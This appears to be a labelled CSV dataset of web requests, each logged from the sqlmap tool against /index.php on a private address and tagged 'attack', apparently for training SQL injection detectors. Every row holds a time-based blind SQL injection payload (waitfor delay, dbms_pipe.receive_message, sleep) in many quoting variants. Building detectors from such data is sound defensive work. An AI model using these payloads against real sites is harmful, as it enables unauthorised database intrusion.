/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as zjte where 4863=4863 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as uggs where 8880=8880 waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 2969=2969 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 9262=9262 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) as aojz where 8616=8616 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as ytmi where 4779=4779 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 8586=8586 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs`) where 1327=1327 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- bqbn",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- doat",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ((('prmv'='prmv",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and 'wypz'='wypz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ('zjlm' like 'zjlm",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (('iyen' like 'iyen",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ((('vkzz' like 'vkzz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (""htgw""=""htgw",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ((""mqri""=""mqri",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (((""lqgm""=""lqgm",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ""lhgj""=""lhgj",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (""pcbp"" like ""pcbp",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (((""yboq"" like ""yboq",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ""afdg"" like ""afdg",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%') and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ('%'='",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%'))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ((('%'='",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%' and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and '%'='",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%""))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (((""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') where 8898=8898 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- oees",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") where 1132=1132 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- nlce",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' where 1749=1749 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- qwob",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" where 2456=2456 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- mgox",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'||(select 'cahq' from dual where 8639=8639 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5))||'",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' (select ptwb where 7279=7279 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)) '",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' (select 'foym' where 2148=2148 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)) '",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) as mven where 7541=7541 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- ynoy",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as vlop where 9705=9705 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- fclq",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') as wxjg where 7402=7402 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- rhyq",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as ksmw where 8042=8042 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- lvyp",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' in boolean mode) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- enhs",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs))) and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5) and (((1074=1074",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- rvrv",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)# uydh",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs where 6642=6642 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- ppbw",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) as iale where 4379=4379 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- yytz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) as lamn where 9459=9459 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- wbuc",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs`) where 2694=2694 and 1675=dbms_pipe.receive_message(chr(65)||chr(75)||chr(99)||chr(83),5)-- pwez",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'))) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%') and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%')) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%'))) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%' and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"")) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%""))) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') where 5479=5479 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") where 2706=2706 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' where 5592=5592 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" where 4904=4904 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'||(select 'jwrv' from dual where 3869=3869 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs'||(select 'fqkz' where 1027=1027 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' (select aemr where 8206=8206 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' (select 'fdpc' where 3904=3904 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) as dslv where 9866=9866 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as nkjv where 6319=6319 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') as ydiq where 8136=8136 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as seqq where 4461=4461 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs))) and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) where 5780=5780 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs where 3338=3338 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) as ajmq where 6711=6711 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) as ywvj where 2027=2027 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs` where 2160=2160 and 9809=dbms_pipe.receive_message(chr(105)||chr(106)||chr(67)||chr(121),5)--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",(case when (7707=7707) then sleep(5) else 7707 end),attack
